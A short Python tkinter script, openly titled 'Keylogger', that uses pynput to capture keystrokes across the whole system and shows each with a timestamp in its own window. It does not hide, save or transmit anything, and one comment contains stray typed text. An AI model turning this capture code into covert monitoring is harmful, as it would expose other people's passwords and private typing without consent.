import tkinter as tk
from tkinter import scrolledtext, messagebox
from pynput.keyboard import Listener
from datetime import datetime
import time
class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("400x300")
        self.last_time = time.time()
        # Create a title labelthis is a very sensitive password
        self.title_label = tk.Label(root, text="Keylogger", font=("Arial", 16))
        self.title_label.pack(pady=10)

        # Create a scrolled text area for logging
        self.log_display = scrolledtext.ScrolledText(root, wrap=tk.WORD, height=15, width=50)
        self.log_display.pack(pady=10)

        # Create a clear button
        self.clear_button = tk.Button(root, text="Clear Log", command=self.clearLog)
        self.clear_button.pack(pady=5)

        # Start the keylogger
        self.startKeylogger()

    def updateLog(self, key):
        print("Wait")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.log_display.insert(tk.END, f"{timestamp} - {key}\n")
        self.log_display.see(tk.END)  # Auto-scroll to the end
        print("Got it")

    def clearLog(self):

        self.log_display.delete(1.0, tk.END)

    def startKeylogger(self):
        self.listener = Listener(on_press=self.updateLog)
        self.listener.start()

    def onClose(self):
        self.listener.stop()
        self.root.destroy()

# GUI init
root = tk.Tk()
app = KeyloggerGUI(root)


root.protocol("WM_DELETE_WINDOW", app.onClose)

root.mainloop()